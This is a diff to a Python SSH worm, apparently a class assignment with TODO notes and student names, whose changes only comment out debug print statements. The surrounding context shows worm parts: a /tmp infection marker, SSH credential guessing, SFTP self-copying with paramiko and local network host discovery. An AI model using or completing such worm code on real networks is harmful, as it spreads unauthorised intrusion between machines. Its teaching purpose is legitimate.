@@ -38,7 +38,7 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
 # TODO(): ADD CODE TO CHECK IF IT'S INFECTED
 def isInfectedSystem():
-	print("def isInfectedSystem():")
+	#print("def isInfectedSystem():")
 	# Check if the system as infected. One
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
@@ -65,7 +65,7 @@ def isInfectedSystem():
 # TODO(): ASSUMING THIS USES isInfectedSystem(), mark the system as infected, so it relies
 # on the previous function to work 
 def markInfected():
-	print("def markInfected():")
+	#print("def markInfected():")
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
@@ -88,7 +88,7 @@ def markInfected():
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
-	print("def spreadAndExecute(sshClient):")
+	#print("def spreadAndExecute(sshClient):")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -108,9 +108,9 @@ def spreadAndExecute(sshClient):
 
 	# kevin
 	ssh = paramiko.SSHClient()
-	print("SSH 1",sshClient[1] )
-	print("SSH 2",sshClient[2] )
-	print("SSH 3",sshClient[3] )
+	#print("SSH 1",sshClient[1] )
+	#print("SSH 2",sshClient[2] )
+	#print("SSH 3",sshClient[3] )
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	ssh.connect(sshClient[1], username=sshClient[2], password=sshClient[3])
 	sftpClient = ssh.open_sftp()
@@ -130,7 +130,7 @@ def spreadAndExecute(sshClient):
 # 3 = probably the server is down or is not running SSH
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
-	print("def tryCredentials(host, userName, password, sshClient):")
+	#print("def tryCredentials(host, userName, password, sshClient):")
 	
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -178,7 +178,7 @@ def tryCredentials(host, userName, password, sshClient):
 # If the attack failed, returns a NULL
 ###############################################################
 def attackSystem(host):
-	print("def attackSystem(host):")
+	#print("def attackSystem(host):")
 	# The credential list
 	global credList
 	
@@ -223,7 +223,7 @@ def attackSystem(host):
 # @return - The IP address of the current system
 ####################################################
 def getMyIP(interface):
-	print("def getMyIP(interface)")
+	#print("def getMyIP(interface)")
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
 	
@@ -280,7 +280,7 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-print("1")
+#print("1")
 if len(sys.argv) < 2:
 	
 	# TODO: If we are running on the victim, check if 
@@ -289,14 +289,14 @@ if len(sys.argv) < 2:
 	# Desirae Prather 
 	if isInfectedSystem()==1:
 		#terminate
-		print("2")
+		#print("2")
 		exit(1)
 	else:
 		# infect victim
 		markInfected()
 	# /DesiraePrather
 		
-print("3")
+#print("3")
 # TODO: Get the IP of the current system
 # Desirae Prather
 interface = interfaces()
